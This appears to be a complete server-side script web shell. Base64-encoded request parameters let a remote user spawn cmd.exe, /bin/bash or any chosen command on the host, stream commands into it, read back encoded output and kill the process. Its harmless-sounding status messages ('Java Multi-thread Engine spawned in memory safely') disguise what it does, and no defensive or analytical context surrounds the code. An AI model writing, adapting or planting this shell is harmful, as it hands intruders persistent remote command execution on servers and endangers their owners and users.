<%

var paramMap = request.getParameterMap();
var type = "";
var z1 = "";

if (paramMap.containsKey("z0"))
    type = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z0")[0]), "UTF-8");
if (paramMap.containsKey("z1"))
    z1 = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z1")[0]), "UTF-8");

var session = request.getSession();
var result = { "status": "fail", "msg": "" };

if (type == "create") {
    try {
        var os = java.lang.System.getProperty("os.name").toLowerCase();
        var isWin = os.contains("win");
        var shellCmd = z1 ? z1 : (isWin ? "cmd.exe" : "/bin/bash");

        var pb = new java.lang.ProcessBuilder(shellCmd.split(" "));
        pb.redirectErrorStream(true);

        var process = pb.start();
        var outputBuffer = new java.io.ByteArrayOutputStream();

        session.setAttribute("shell_proc", process);
        session.setAttribute("shell_in", process.getOutputStream());
        session.setAttribute("shell_out_buf", outputBuffer);

        var readThread = new java.lang.Thread(new java.lang.Runnable({
            run: function() {
                try {
                    var is = process.getInputStream();
                    var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
                    var readLen = 0;

                    while ((readLen = is.read(bytes)) != -1) {
                        outputBuffer.write(bytes, 0, readLen);
                    }
                } catch (e) {
                    // do something
                }
            }
        }));

        readThread.start();

        result.status = "success";
        result.msg = "Java Multi-thread Engine spawned in memory safely.";
    } catch (e) {
        result.msg = "Failed: " + e.message;
    }
    
    echo(JSON.stringify(result));
} else if (type == "write") {
    var osStream = session.getAttribute("shell_in");
    if (osStream != null) {
        try {
            var cmdBytes = String(z1).getBytes("UTF-8");
            osStream.write(cmdBytes);
            osStream.flush();

            result.status = "success";
            result.msg = "Input stream piped directly.";
        } catch (e) { result.msg = e.message; }
    } else {
        result.msg = "Engine is not running.";
    }

    echo(JSON.stringify(result));
} else if (type == "read") {
    var outputBuffer = session.getAttribute("shell_out_buf");
    var process = session.getAttribute("shell_proc");

    if (outputBuffer != null) {
        var currentBytes = outputBuffer.toByteArray();
        outputBuffer.reset();

        var b64Output = java.util.Base64.getEncoder().encodeToString(currentBytes);
        
        result.status = "success";
        result.msg = b64Output;
    } else {
        result.msg = "No active channel buffer found.";
    }

    echo(JSON.stringify(result));
} else if (type == "stop") {
    var process = session.getAttribute("shell_proc");
    if (process != null) {
        try {
            process.destroyForcibly();
        } catch (e) {}
    }
    session.removeAttribute("shell_proc");
    session.removeAttribute("shell_in");
    session.removeAttribute("shell_out_buf");

    result.status = "stop";
    result.msg = java.util.Base64.getEncoder().encodeToString(String("Engine shutdown successfully.").getBytes("UTF-8"));

    echo(JSON.stringify(result));
}

%>